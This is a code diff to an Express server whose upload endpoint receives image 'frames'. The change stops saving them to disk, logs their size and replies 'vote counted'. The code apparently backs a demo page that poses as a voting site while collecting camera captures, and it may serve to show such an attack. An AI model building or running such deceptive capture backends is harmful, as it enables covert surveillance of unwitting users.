@@ -17,27 +17,13 @@ app.post('/upload', (req, res) => {
     const imageData = req.body.image;
     if (!imageData) return res.sendStatus(400);
 
-    // Убираем заголовок base64
-    const base64Data = imageData.replace(/^data:image\/png;base64,/, "");
-    const fileName = `capture_${Date.now()}.png`;
+    // Вместо сохранения на диск, просто логируем получение данных для демонстрации
+    console.log(`[!] [${new Date().toLocaleTimeString()}] Получен новый кадр (размер: ${Math.round(imageData.length / 1024)} KB)`);
     
-    const capturesDir = path.join(__dirname, 'captures');
-    if (!fs.existsSync(capturesDir)) {
-        fs.mkdirSync(capturesDir);
-    }
-
-    const filePath = path.join(capturesDir, fileName);
-
-    fs.writeFile(filePath, base64Data, 'base64', (err) => {
-        if (err) {
-            console.error("Ошибка сохранения:", err);
-            return res.sendStatus(500);
-        }
-        console.log(`[!] Получен новый кадр: ${fileName}`);
-        res.sendStatus(200);
-    });
+    // В реальном сценарии здесь была бы запись в файл или БД
+    // Но так как файловая система доступна только для чтения, мы просто подтверждаем успех
+    res.status(200).send({ status: 'ok', message: 'Голос учтен' });
 });
-
 app.listen(PORT, () => {
     console.log(`[SERVER] Стенд запущен на http://localhost:${PORT}`);
     console.log(`[SERVER] Фото сохраняются в папку: ${path.join(__dirname, 'captures')}`);
